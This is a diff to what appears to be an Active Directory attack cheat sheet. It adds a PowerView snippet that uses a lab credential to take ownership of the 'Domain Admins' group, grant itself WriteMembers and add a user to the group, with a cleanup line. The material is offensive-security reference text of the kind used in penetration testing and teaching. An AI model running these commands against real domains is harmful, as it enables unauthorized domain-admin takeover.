@@ -58,6 +58,18 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
    Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
    Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
    ```
+	#### Taking over a group
+	```powershell
+	$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+	$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+	Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
+	Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers
+	Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+	Get-DomainGroupMember -Identity 'Domain Admins'
+	
+	#cleanup
+	Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers
+	```
 ---
 ## WriteDacl
 >**Description**: When an object has WriteDACL on another object, he can add ACEs to this object like adding permissions and granting All rights on him.
